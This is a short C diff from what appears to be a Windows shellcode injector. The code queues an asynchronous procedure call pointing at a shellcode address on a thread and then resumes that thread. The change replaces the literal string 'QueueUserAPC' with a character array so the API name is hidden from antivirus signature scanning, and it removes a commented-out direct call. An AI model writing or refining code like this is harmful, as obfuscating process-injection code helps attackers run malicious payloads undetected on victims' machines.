@@ -156,9 +156,9 @@ int main() {
 
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
 
-    QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "QueueUserAPC");
+    char aQueueUserAPC[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0'};
+    QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aQueueUserAPC);
     pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
-    //QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
-
+    
     ResumeThread(threadHandle);
 }
